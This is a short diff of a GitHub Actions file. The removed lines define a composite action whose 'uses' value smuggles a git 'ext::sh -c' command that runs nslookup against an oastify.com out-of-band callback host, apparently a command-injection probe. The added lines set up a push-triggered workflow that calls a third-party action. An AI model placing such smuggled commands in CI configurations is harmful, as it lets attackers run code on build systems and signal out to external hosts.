@@ -1,6 +1,6 @@
-name: apple
-runs:
-  using: composite
-  steps:
-    - uses: ext::sh -c 'nslookup https://0fgk1ssyaw8qj6bgxf6r8dx1ys4jsbg0.oastify.com/test'@v1
-      shell: bash
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: efinnTFgit/horserabbit@v1
